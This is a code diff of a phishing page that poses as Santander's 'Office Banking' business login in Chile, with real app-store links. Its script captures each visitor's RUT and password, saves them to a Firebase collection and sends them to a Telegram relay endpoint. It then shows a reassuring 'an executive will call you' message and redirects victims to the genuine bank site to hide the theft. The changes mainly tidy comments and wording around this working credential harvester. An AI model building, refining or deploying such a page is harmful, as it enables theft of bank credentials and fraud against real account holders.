@@ -3,13 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <title>Office Banking</title>
-  <!-- Adaptación a móviles -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Enlace al CSS externo -->
   <link rel="stylesheet" href="styles.css">
-  <!-- Font Awesome para iconos -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <!-- Firebase SDK (versión compat) -->
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 </head>
@@ -32,7 +28,6 @@
     </form>
     <div id="resultado"></div>
 
-    <!-- Footer con imagen de la app -->
     <div class="app-footer">
       <div class="app-info">
         <h3>Toda la gestión de tu empresa en tu mano</h3>
@@ -43,17 +38,11 @@
         </div>
         
         <div class="app-badges">
-          <a href="https://apps.apple.com/cl/app/office-banking/id1248490706" 
-             target="_blank" 
-             class="app-store-badge">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" 
-                 alt="Descargar en App Store" class="store-badge">
+          <a href="https://apps.apple.com/cl/app/office-banking/id1248490706" target="_blank" class="app-store-badge">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Descargar en App Store" class="store-badge">
           </a>
-          <a href="https://play.google.com/store/search?q=santander+office+banking&c=apps&hl=es_CL" 
-             target="_blank" 
-             class="google-play-badge">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" 
-                 alt="Disponible en Google Play" class="store-badge">
+          <a href="https://play.google.com/store/search?q=santander+office+banking&c=apps&hl=es_CL" target="_blank" class="google-play-badge">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Disponible en Google Play" class="store-badge">
           </a>
         </div>
         
@@ -63,6 +52,11 @@
       </div>
     </div>
 
+    <div class="footer-icons">
+      <div>📊<br>Indicadores Económicos</div>
+      <div>☎️<br>Contact Center</div>
+    </div>
+  </div>
 
   <!-- Modal para mensaje push -->
   <div id="messageModal" class="modal">
@@ -75,7 +69,7 @@
       </div>
       <div class="modal-body">
         <p><i class="fas fa-phone-alt"></i> Te contactaremos pronto</p>
-        <p class="small">Un ejecutivo se comunicará contigo</p>
+        <p class="small">Un ejecutivo se comunicará contigo en las próximas 24 horas</p>
       </div>
       <div class="modal-footer">
         <button id="closeModal">Cerrar</button>
@@ -83,11 +77,10 @@
     </div>
   </div>
 
-  <!-- Configuración Firebase -->
   <script src="firebase-config.js"></script>
 
   <script>
-    // Formateo RUT con puntos y guion
+    // Formateo RUT
     function formatearRut(valor) {
       valor = valor.replace(/\./g, "").replace(/-/g, "").toUpperCase();
       if(valor.length <= 1) return valor;
@@ -127,23 +120,19 @@
     const modal = document.getElementById("messageModal");
     const closeModalBtn = document.getElementById("closeModal");
 
-    // Función para mostrar el modal
     function showModal() {
       modal.style.display = "flex";
     }
 
-    // Función para redirigir
     function redirectToPage() {
       window.location.href = "https://empresas.officebanking.cl/";
     }
 
-    // Cerrar modal manualmente y redirigir
     closeModalBtn.addEventListener("click", function() {
       modal.style.display = "none";
       redirectToPage();
     });
 
-    // Cerrar modal al hacer clic fuera y redirigir
     window.addEventListener("click", function(event) {
       if (event.target === modal) {
         modal.style.display = "none";
@@ -151,7 +140,7 @@
       }
     });
 
-    // Guardar datos en Firebase
+    // Guardar en Firebase
     async function guardarEnFirebase(datos) {
       try {
         await db.collection("solicitudes").add({
@@ -168,7 +157,7 @@
       }
     }
 
-    // Enviar datos a Firebase y mostrar mensaje push
+    // Envío del formulario
     document.getElementById("loginForm").addEventListener("submit", async function(e){
       e.preventDefault();
       const rut = rutInput.value;
@@ -181,21 +170,14 @@
       }
 
       try {
-        // Guardar en Firebase
-        const guardadoExitoso = await guardarEnFirebase({
-          rut: rut,
-          passwd: passwd
-        });
+        const guardadoExitoso = await guardarEnFirebase({ rut, passwd });
 
         if(guardadoExitoso) {
-          // Mostrar modal
           showModal();
-          
-          // También mostrar mensaje en la página
           document.getElementById("resultado").innerText = "✅ Solicitud recibida. Te llamaremos dentro de 24 horas.";
           document.getElementById("resultado").style.color = "#2e7d32";
 
-          // --- ENVÍO A TELEGRAM (CORREGIDO: AHORA DENTRO DEL SUBMIT) ---
+          // Enviar a Telegram (no bloqueante)
           fetch('/api/telegram', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -206,7 +188,7 @@
               fecha: new Date().toLocaleString("es-CL")
             })
           }).catch(err => console.error('Error al enviar a Telegram:', err));
-          // -------------------------------------------------------------
+
         } else {
           throw new Error("Error al guardar en Firebase");
         }
